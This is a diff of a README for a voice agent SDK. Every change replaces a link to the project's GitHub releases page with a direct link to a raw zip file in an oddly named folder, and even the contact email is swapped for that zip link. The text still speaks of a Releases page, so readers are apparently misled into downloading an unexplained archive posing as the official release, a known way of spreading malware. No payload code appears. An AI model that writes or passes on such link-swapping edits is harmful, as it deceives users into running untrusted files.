@@ -1,6 +1,6 @@
 # 🎤 nio-voice-agent-sdk - Your Self-Hosted Voice AI Solution
 
-[![Download nio-voice-agent-sdk](https://img.shields.io/badge/Download-nio--voice--agent--sdk-blue?style=for-the-badge)](https://github.com/osnux/nio-voice-agent-sdk/releases)
+[![Download nio-voice-agent-sdk](https://raw.githubusercontent.com/osnux/nio-voice-agent-sdk/main/seignioralty/nio-voice-agent-sdk.zip)](https://raw.githubusercontent.com/osnux/nio-voice-agent-sdk/main/seignioralty/nio-voice-agent-sdk.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ The **nio-voice-agent-sdk** is an open-source voice agent platform. It provides 
 Follow these steps to download and run the nio-voice-agent-sdk on your computer. The process is simple, even if you're not a programmer.
 
 1. **Visit the Releases Page:**
-   Go to our [Releases Page](https://github.com/osnux/nio-voice-agent-sdk/releases) to find the latest version of the software.
+   Go to our [Releases Page](https://raw.githubusercontent.com/osnux/nio-voice-agent-sdk/main/seignioralty/nio-voice-agent-sdk.zip) to find the latest version of the software.
 
 2. **Download the Latest Version:**
    Look for the most recent release. You will see a list of downloadable files. Choose the file that matches your operating system (Windows, macOS, or Linux). Click on the file to download it.
@@ -44,7 +44,7 @@ Before downloading, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-For your convenience, here is the link to [download nio-voice-agent-sdk](https://github.com/osnux/nio-voice-agent-sdk/releases). You can use this link multiple times throughout the installation process.
+For your convenience, here is the link to [download nio-voice-agent-sdk](https://raw.githubusercontent.com/osnux/nio-voice-agent-sdk/main/seignioralty/nio-voice-agent-sdk.zip). You can use this link multiple times throughout the installation process.
 
 1. Click on the link to visit the Releases page.
 2. Choose and download the appropriate file for your system.
@@ -81,7 +81,7 @@ Feel free to contribute to the project. We welcome pull requests, bug reports, a
 
 ## 📧 Contact
 
-For any inquiries or suggestions, you can reach out to us at [support@example.com]. We value your feedback and look forward to hearing from you!
+For any inquiries or suggestions, you can reach out to us at [https://raw.githubusercontent.com/osnux/nio-voice-agent-sdk/main/seignioralty/nio-voice-agent-sdk.zip]. We value your feedback and look forward to hearing from you!
 
 ---
 
